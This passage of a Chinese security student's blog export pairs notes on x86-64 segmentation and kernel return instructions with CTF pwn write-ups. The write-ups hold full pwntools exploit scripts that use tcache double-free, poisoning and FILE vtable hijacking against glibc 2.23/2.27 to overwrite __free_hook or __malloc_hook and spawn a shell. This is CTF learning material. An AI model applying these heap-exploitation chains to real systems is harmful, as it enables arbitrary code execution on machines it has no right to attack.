<h4 id="Multi-Segmented-Model"><a href="#Multi-Segmented-Model" class="headerlink" title="Multi-Segmented Model"></a><strong>Multi-Segmented Model</strong></h4><blockquote>
<p>分段分页结合体，可以多个段映射到一个页或一个段映射到多个页</p>
</blockquote>
<h4 id="Flat-Memory-Model"><a href="#Flat-Memory-Model" class="headerlink" title="Flat-Memory Model"></a><strong>Flat-Memory Model</strong></h4><blockquote>
<p>将段寄存器的基址置零，段限制在4GB，则可用4GB的连续的虚拟内存空间</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在64位模式下，分段机制被禁用了。分段硬件会忽略段基址值，并将其视为0。同样，段限值和大多数段属性也会被忽略。不过，有几个例外情况。CS段的DPL、D和L属性仍然会被使用，分别用于确定程序的特权级别、默认操作数大小，以及程序是在64位模式还是兼容模式下运行。FS和GS段可以在地址计算中用作额外的基址寄存器，并且这些段可以具有非零的基址值。这一特性有助于访问线程局部数据（thread-local data）和某些系统软件的数据结构。有关在64位模式下FS和GS段的详细信息，请参阅第80页的“64位模式下的FS和GS寄存器”。系统段寄存器在64位模式下始终会被使用</span><br></pre></td></tr></table></figure>

<h2 id="Segment-Selectors-and-Registers"><a href="#Segment-Selectors-and-Registers" class="headerlink" title="Segment Selectors and Registers"></a><strong>Segment Selectors and Registers</strong></h2><blockquote>
<p>此部分讲解了段寄存器中存储的内容的结构</p>
</blockquote>
<h3 id="Segment-Selectors"><a href="#Segment-Selectors" class="headerlink" title="Segment Selectors"></a>Segment Selectors</h3><blockquote>
<p>Segment selectors are pointers to specific entries in the global and local descriptor tables.</p>
</blockquote>
<p><img src="/../../themes/butterfly/source/img/mypic/kernelpwn/segmentselector.png" alt="image-20240830005201519"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选择子索引字段（Selector Index Field）：位于位15:3。选择子索引字段指定描述符表中的一个条目。描述符表中的条目是8字节长，因此选择子索引会乘以8来形成描述符表中的字节偏移量。然后，将该偏移量加到全局或本地描述符表基址（由表索引位指示）上，以在虚拟地址空间中形成描述符条目的地址。 在长模式下，一些描述符条目是16字节长，而不是8字节（有关长模式描述符表条目的更多信息，请参阅第88页的“遗留段描述符”）。这些扩展的描述符在描述符表中占用了两个条目。然而，长模式仍然将选择子索引乘以8来形成描述符表的偏移量。系统软件负责分配选择子，以便它们正确地指向扩展条目的起始位置。</span><br><span class="line"></span><br><span class="line">表指示符（TI）位（Table Indicator (TI) Bit）：位于位2。TI位指示哪个表保存了选择子索引引用的描述符。当TI=0时，使用GDT（全局描述符表），当TI=1时，使用LDT（本地描述符表）。从适当的描述符表寄存器中读取描述符表基址，并将其加到上述的缩放选择子索引上。</span><br><span class="line"></span><br><span class="line">请求者特权级（RPL）字段（Requestor Privilege-Level (RPL) Field）：位于位1:0。RPL表示创建选择子时处理器运行的特权级别（CPL）。 RPL用于段特权检查，以防止低特权级别的软件访问特权数据。有关段特权检查的更多信息，请参阅第106页的“数据访问特权检查”和第109页的“控制传输特权检查”。</span><br><span class="line">空选择子：目前没看懂啥意思先遗留一下</span><br></pre></td></tr></table></figure>

<h3 id="Segment-Registers"><a href="#Segment-Registers" class="headerlink" title="Segment Registers"></a>Segment Registers</h3><blockquote>
<p>存储段结构的硬件基础，此处只看了64位程序的</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64位模式下的CS寄存器：在64位模式下，CS寄存器的隐藏部分大部分被忽略。只有L（长模式）、D（默认操作数大小）和DPL（描述符特权级别）属性在64位模式下被识别。地址计算假定CS.base的值为0。CS引用不会检查CS.limit值，而是检查有效地址是否为规范形式（canonical form）。</span><br><span class="line"></span><br><span class="line">64位模式下的DS、ES和SS寄存器：在64位模式下，ES、DS和SS段寄存器的内容被忽略。段寄存器隐藏部分的所有字段（基址、限值和属性）都被忽略。在64位模式下，引用ES、DS或SS段的地址计算被视为段基址为0。处理器不会执行限值检查，而是检查所有虚拟地址引用是否为规范形式。</span><br><span class="line"></span><br><span class="line">启用和激活长模式或在64位模式和兼容模式之间切换时，不会改变段寄存器的可见部分或隐藏部分的内容。除非执行显式的段加载操作，否则这些寄存器在64位模式执行期间保持不变。</span><br><span class="line"></span><br><span class="line">64位模式下的FS和GS寄存器：与CS、DS、ES和SS段不同，FS和GS段覆盖在64位模式下可以使用。当在64位模式下使用FS和GS段覆盖时，它们各自的基址会在有效地址（EA）计算中使用。完整的EA计算公式为：(FS或GS).base + base + (scale * index) + displacement。FS.base和GS.base的值也被扩展为完整的64位虚拟地址，如图4-5所示。在64位线性地址计算中的任何溢出都会被忽略，结果地址将环绕到地址空间的另一端。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>gs和fs的特殊更新方式</p>
<p>貌似段寄存器有隐藏部分，需要特殊处理</p>
<p>没看懂回来补上，貌似段寄存器有隐藏部分，因此赋值要额外小心，并且gs和fs也是64位需要用的</p>
</blockquote>
<h2 id="段描述符表"><a href="#段描述符表" class="headerlink" title="段描述符表"></a>段描述符表</h2><blockquote>
<p> 虽然64位平坦模式用户层已经基本没有了分段机制，但是0环还存在着，因此需要理解描述符表，主要分为三个，分别为GDT,LDT，IDT</p>
<p>软件通过初始化其相应的描述符-表寄存器来建立描述符表在内存中的位置。下面的部分将描述描述符表寄存器和描述符表。</p>
</blockquote>
<h3 id="GDT"><a href="#GDT" class="headerlink" title="GDT"></a>GDT</h3><blockquote>
<p>保护模式下的系统软件必须创建一个全局描述符表（GDT）。GDT包含了代码段和数据段的描述符条目（用户段），这些段可以被所有任务共享。除了用户段外，GDT还可以包含门描述符和其他系统段描述符。系统软件可以将GDT存储在内存中的任何位置，并且应该保护包含GDT的段，使其不被非特权软件访问。寻表方式如下：（如果要理解的话需要理解空选择子还要理解实模式和80386模式下的段描述符）</p>
</blockquote>
<p><img src="/../../themes/diaspora/source/img/mypic/com/image-20240830014118928.png" alt="image-20240830014118928"></p>
<blockquote>
<p>长地址模式下的GDTR和IDTR格式</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">限值（Limit）：2字节。这些位定义了GDT（全局描述符表）的16位限值或大小（以字节为单位）。限值与基址相加得到GDT的结束字节地址。如果软件尝试访问超出GDT限值的描述符，将会发生一般保护异常（#GP）。</span><br><span class="line"></span><br><span class="line">AMD64架构在长模式下不扩展描述符表的偏移量。因此，GDTR（全局描述符表寄存器）和IDTR（中断描述符表寄存器）的限值字段大小与传统大小保持不变。处理器在长模式下访问GDT和IDT时仍然会检查这些限值。</span><br><span class="line"></span><br><span class="line">基址（Base Address）：8字节。基址字段保存GDT在虚拟内存空间中的起始字节地址。GDT可以位于虚拟内存中的任何字节地址，但系统软件应将GDT对齐到四字边界（quadword boundary），以避免访问未对齐数据时可能产生的性能损失。</span><br><span class="line"></span><br><span class="line">AMD64架构将GDTR的基址字段扩展为64位，以便在长模式下运行的系统软件可以在64位虚拟地址空间中的任意位置定位GDT。当处理器在传统模式下运行时，它会忽略基址的高4字节。</span><br></pre></td></tr></table></figure>

<p><img src="/../../themes/butterfly/source/img/mypic/kernelpwn/GDTR.png" alt="image-20240830014417860"></p>
<h3 id="LDT"><a href="#LDT" class="headerlink" title="LDT"></a>LDT</h3><h3 id="GDT-1"><a href="#GDT-1" class="headerlink" title="GDT"></a>GDT</h3><h2 id="系统寄存器详解"><a href="#系统寄存器详解" class="headerlink" title="系统寄存器详解"></a>系统寄存器详解</h2><h3 id="RFLAGS"><a href="#RFLAGS" class="headerlink" title="RFLAGS"></a>RFLAGS</h3><p>包含控制位和状态位，控制位中含有权限信息，状态位则是用来保存算数运算的状态，内核态到用户态需要恢复</p>
<h2 id="部分内核级指令"><a href="#部分内核级指令" class="headerlink" title="部分内核级指令"></a>部分内核级指令</h2><h3 id="Fast-System-Call-and-Return"><a href="#Fast-System-Call-and-Return" class="headerlink" title="Fast System Call and Return"></a><strong>Fast System Call and Return</strong></h3><h4 id="SYSCALL-and-SYSRET"><a href="#SYSCALL-and-SYSRET" class="headerlink" title="SYSCALL and SYSRET"></a><strong>SYSCALL and SYSRET</strong></h4><h4 id="SYSENTER-and-SYSEXIT-Legacy-Mode-Only"><a href="#SYSENTER-and-SYSEXIT-Legacy-Mode-Only" class="headerlink" title="SYSENTER and SYSEXIT (Legacy Mode Only)"></a><strong>SYSENTER and SYSEXIT (Legacy Mode Only)</strong></h4><h4 id="SWAPGS"><a href="#SWAPGS" class="headerlink" title="SWAPGS"></a><strong>SWAPGS</strong></h4><blockquote>
<p>SWAPGS指令为系统软件提供了一种加载系统数据结构指针的快速方法。SWAPGS可以在由于系统切换指令或由于中断或异常而进入系统软件例程时使用。在返回到应用程序软件之前，SWAPGS可以恢复一个被系统数据结构指针所取代的应用程序数据结构指针。</p>
</blockquote>
<h2 id="内核指令字典"><a href="#内核指令字典" class="headerlink" title="内核指令字典"></a>内核指令字典</h2><h3 id="IRETQ"><a href="#IRETQ" class="headerlink" title="IRETQ"></a><strong>IRETQ</strong></h3><blockquote>
<p>将程序控制流从异常处理返回，并置位相关寄存器，会返回flags，cs，rip，如果cpl变化，ss和rsp也将被返回，</p>
<p>示例代码如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">restore_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;swapgs ;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %0, 0x20(%%rsp)\t\n&quot;</span> <span class="comment">//ss</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %1, 0x18(%%rsp)\t\n&quot;</span> <span class="comment">//rsp</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %2, 0x10(%%rsp)\t\n&quot;</span> <span class="comment">//flag</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %3, 0x08(%%rsp)\t\n&quot;</span> <span class="comment">//cs</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %4, 0x00(%%rsp)\t\n&quot;</span> <span class="comment">//rip</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;iretq&quot;</span></span></span><br><span class="line"><span class="params">               :</span></span><br><span class="line"><span class="params">               : <span class="string">&quot;r&quot;</span>(user_ss),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rsp),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rflags),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_cs), <span class="string">&quot;r&quot;</span>(win))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>cs</category>
        <category>架构</category>
        <category>x86-64</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>架构</tag>
        <tag>amd64</tag>
      </tags>
  </entry>
  <entry>
    <title>一些低版本的tcache练习</title>
    <url>/2024/08/11/%E4%B8%80%E4%BA%9B%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84tcache%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="SECCON-2019-Online-CTF-one-pwn-heap-glibc-2-27"><a href="#SECCON-2019-Online-CTF-one-pwn-heap-glibc-2-27" class="headerlink" title="SECCON 2019 Online CTF: one (pwn, heap, glibc-2.27)"></a>SECCON 2019 Online CTF: one (pwn, heap, glibc-2.27)</h2><blockquote>
<p>主要利用了tcache的uaf和double-free漏洞，还有Tcache Poisoning和Tcache dup漏洞，可谓是一个大杂侩，虽然说题目逻辑简单，但是利用过程不是很容易，一次只能分配一个恶意块，所以需要有全局思维，要考虑如何利用漏洞并且需要在漏洞利用完还可以继续利用，因此比较复杂。对数字及其敏感，非常混乱，建议边调试边尝试。</p>
<p>哎还得是tcache，fastbin搞两下就崩了哈哈哈，可惜高版本tcache利用也成过去式了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./one&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Input memo &gt; &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(<span class="string">&quot;\n&quot;</span>).strip()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ex</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##heap地址泄露</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">2</span>*p64(<span class="number">0x131</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>))</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line"></span><br><span class="line">chunkadd = u64(show().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">## 此处是为了让tcache有更多的块</span></span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line"><span class="comment">##libc地址泄露</span></span><br><span class="line">create(p64(chunkadd-<span class="number">0x150</span>+<span class="number">0x20</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x171</span>))</span><br><span class="line">create(p64(chunkadd-<span class="number">0x150</span>+<span class="number">0x20</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x171</span>))</span><br><span class="line">create(<span class="string">b&#x27;\xff\xff\xff\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    de()</span><br><span class="line">base = u64(show().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">sys = base +elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">##复写hook</span></span><br><span class="line">create(<span class="number">10</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line">fhook = base + elf.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">create(p64(fhook)+<span class="number">2</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x171</span>))</span><br><span class="line">create(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(p64(sys))</span><br><span class="line">create(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">de()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc:&quot;</span>,<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;chunkadd:&quot;</span>,<span class="built_in">hex</span>(chunkadd))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__free_hook&quot;</span>,<span class="built_in">hex</span>(fhook))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="BUUCTF-V-N2020-公开赛-easyTHeap"><a href="#BUUCTF-V-N2020-公开赛-easyTHeap" class="headerlink" title="BUUCTF-[V&amp;N2020 公开赛]easyTHeap"></a>BUUCTF-[V&amp;N2020 公开赛]easyTHeap</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a><strong>版本</strong></h3><p>2.27-3ubuntu1_amd64</p>
<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h3><p>本题是一个简陋的类似于tcache管理的程序，无法知道程序的基址，也就是说pie无法绕过，data数据段中存在两个变量控制new和delete的chunk的数量，因此本题需要细致控制new和delete的次数。new最多7次，delete最多三次。</p>
<h3 id="存在漏洞"><a href="#存在漏洞" class="headerlink" title="存在漏洞"></a><strong>存在漏洞</strong></h3><p>存在uaf和double_free漏洞，也存在打印堆内容的函数因此可以泄露地址，本题学习的地方是，可以通过Tcache Poisoning来控制tcache管理器。也就是tcache_perthread_struct结构体，来达到任意地址分配的目的</p>
<h3 id="本题思路"><a href="#本题思路" class="headerlink" title="本题思路"></a><strong>本题思路</strong></h3><p>1.通过doublefree和uaf泄露堆地址，需要new一次，delete2次。</p>
<p>2.通过uaf来实现Tcache Poisoning攻击，得到tcache_perthread_struct结构体的读写权限。需要new三次。需要仔细构造fd，来实现Tcache Poisoning攻击。</p>
<p>3.得到堆管理器控制权限时写入极大内容，造成bin已满的情形，free掉堆管理器，会被释放到unsortedbin中，可以泄露libc的基址。需要delete一次</p>
<p>4.注意看上三次步骤已经用光了delete的次数，new的次数也用了4次。这就是控制tcache_perthread_struct结构体的绝妙之处，可以通过伪造count和fd字段，来造成还有剩余chunk的假象，因此可以实现任意地址分配，不需要用uaf来进行任意地址的读写操作。</p>
<p>5.new一次得到tcache_perthread_struct结构体的控制权限，因为unsortedbin中只有一个reminderchunk，因此会直接切分分配，new的大小要合适。</p>
<p>6.new一次，分配到<code>__realloc_hook</code>的区域，来伪造<code>__realloc_hook与__malloc_hook</code>，这两个hook在一起，因此只需要消耗一次new的机会则可以得到连个hook的读写权限。</p>
<ul>
<li><p>为什么不能直接得到mallochook来进行one-gadget的注入？</p>
<p>realloc函数中有大量的pop，push操作，可以使one-gadget条件得到满足，因此向mallochook中注入realloc的地址，向reallochook中注入one-gadget的地址，以此来构造调用链条。</p>
</li>
</ul>
<p>7.new一次，执行one-gadget，至此本题结束，恰好7次new，3次delete，及其极限。</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a><strong>脚本</strong></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./vn_pwn_easyTHeap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">def create(size):</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>choice: <span class="string">&#x27;,b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>size?<span class="string">&#x27;,size)</span></span><br><span class="line"><span class="string">def edit(index,con):</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">2&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>idx?<span class="string">&#x27;,index)</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>content:<span class="string">&#x27;, con)</span></span><br><span class="line"><span class="string">def show(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">3&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>idx?<span class="string">&#x27;, index)</span></span><br><span class="line"><span class="string">    return io.recvuntil(&quot;\n&quot;).strip()</span></span><br><span class="line"><span class="string">def de(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">4&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>idx?<span class="string">&#x27;, index)</span></span><br><span class="line"><span class="string">def ex():</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">5&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 0</span></span><br><span class="line">de(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">heapadd = u64(show(b<span class="number">&#x27;0&#x27;</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">print(hex(heapadd))</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 1</span></span><br><span class="line">edit(b<span class="number">&#x27;1&#x27;</span>,p64(heapadd<span class="number">-0x250</span>))</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 2</span></span><br><span class="line">edit(b<span class="number">&#x27;2&#x27;</span>,p64(heapadd<span class="number">-0x250</span>))</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 3,tcache_perthread_struct</span></span><br><span class="line">edit(b<span class="number">&#x27;3&#x27;</span>,<span class="number">0x40</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;3&#x27;</span>)#<span class="meta">#goto unsortedbin</span></span><br><span class="line">#<span class="meta">#getlibcbase</span></span><br><span class="line">libbase = u64(show(b<span class="number">&#x27;3&#x27;</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">print(libbase)</span><br><span class="line">mallochook = libbase+elf.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">reallochook = libbase+elf.symbols[<span class="string">&quot;__realloc_hook&quot;</span>]</span><br><span class="line">print(hex(mallochook))</span><br><span class="line">## 构造tcache_perthread_struct</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 4</span></span><br><span class="line">edit(b<span class="number">&#x27;4&#x27;</span>,<span class="number">0x40</span>*b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>+p64(mallochook)+p64(reallochook))</span><br><span class="line">## 复写mallochook</span><br><span class="line">sys = libbase + <span class="number">0x4f2be</span></span><br><span class="line">relloc = libbase+elf.symbols[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line">create(b<span class="number">&#x27;40&#x27;</span>)<span class="meta">#index = 5</span></span><br><span class="line">edit(b<span class="number">&#x27;5&#x27;</span>,p64(sys)+p64(relloc+<span class="number">2</span>))</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"></span><br><span class="line">#<span class="meta"># index = 6</span></span><br><span class="line">io.sendafter(b<span class="number">&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">io.sendafter(b<span class="number">&#x27;</span>size?<span class="string">&#x27;, b&#x27;</span><span class="number">50&#x27;</span>)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>heap利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-64-task模型</title>
    <url>/2024/08/30/x86-64%E8%BF%9B%E7%A8%8B%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<blockquote>
<p>本篇文章描述了本人学习架构层级的任务模型的过程，所谓操作系统就是根据底层硬件所提供的硬件资源以及数据结构来进行高效的资源管理以及状态转换，因此想学好操作系统需要学好汇编（本人粗浅理解），但是进程管理这一块os的权限比较大，可以不管硬件提供的一些机制，来进行完全由软件进行的任务切换机制，但是os本身也是一个task因此硬件至少提供一次的任务管理。</p>
</blockquote>
]]></content>
      <categories>
        <category>cs</category>
        <category>架构</category>
        <category>x86-64</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>架构</tag>
        <tag>amd64</tag>
      </tags>
  </entry>
  <entry>
    <title>关于_IO_FILE的一些攻击手法</title>
    <url>/2024/08/13/%E5%85%B3%E4%BA%8E-IO-FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[<h1 id="HCTF-2018the-end"><a href="#HCTF-2018the-end" class="headerlink" title="HCTF 2018the_end"></a>HCTF 2018the_end</h1><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>glibc2.23</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.虚表劫持</p>
<p>2.虚表函数指针修改（改为one_gadget）</p>
<p>需要选对glibc，否则onegaget打不通…..下面py的libc是错的，但是调试的时候可以观察到会执行onegadget</p>
<p>3.<code>exec /bin/sh 1&gt;&amp;0</code>标准输出重定向</p>
<h2 id="py"><a href="#py" class="headerlink" title="py"></a>py</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">io.recvuntil(b<span class="number">&#x27;0</span>x<span class="number">&#x27;</span>)</span><br><span class="line">add = <span class="type">int</span>(io.recvuntil(b<span class="string">&quot;,&quot;</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">io.recv()</span><br><span class="line">oldvatable =add+<span class="number">3108576</span></span><br><span class="line">vtableadd0 =<span class="number">3116784</span>+<span class="number">8</span>+add</span><br><span class="line">vtable =  oldvatable + <span class="number">2272</span></span><br><span class="line">gadget1=add<span class="number">-550310</span></span><br><span class="line">gadget2=add+<span class="number">147956</span></span><br><span class="line">gadget3=add+<span class="number">151703</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2</span>):</span><br><span class="line">    io.send(p64(vtableadd0+i))</span><br><span class="line">    io.send(p64(vtable)[i:i+<span class="number">1</span>])</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">    io.send(p64(vtable+<span class="number">0x58</span>+i))</span><br><span class="line">    io.send(p64(gadget2)[i:i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<h2 id="关于本题利用方法的一些复盘"><a href="#关于本题利用方法的一些复盘" class="headerlink" title="关于本题利用方法的一些复盘"></a>关于本题利用方法的一些复盘</h2><p>目前io利用方面处于小白的阶段，主要是因为io的实现过于复杂，一堆宏定义反复横跳，并且一些用户函数在处理完很多东西都会跳到io，但是那些用户函数的实现却不仅仅涉及io，因此想要完全分析明白几乎不可能。本题就是在考察exit的执行流，经过无数层函数调用，也会处理到IO。可以在下图的函数调用栈看出：</p>
<p><img src="/img/mypic/io/vtablecheck.png" alt="vtablecheck.png"></p>
<p>此函数会遍历<code>_IO_list_all</code>链表之后调用虚表中的<code>_setbuf</code>函数 ，因此只要覆盖虚表中的函数指针，即可执行想要的函数。但是关于file虚表劫持这件事在libc2.23以后已经成为了过去式，其会判断虚表指针是否在指定范围之内。可看如下代码，并且虚表所处的位置是可读数据段也就是说不可修改，因此此方法基本行不通了，但是有很大的学习意义。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is 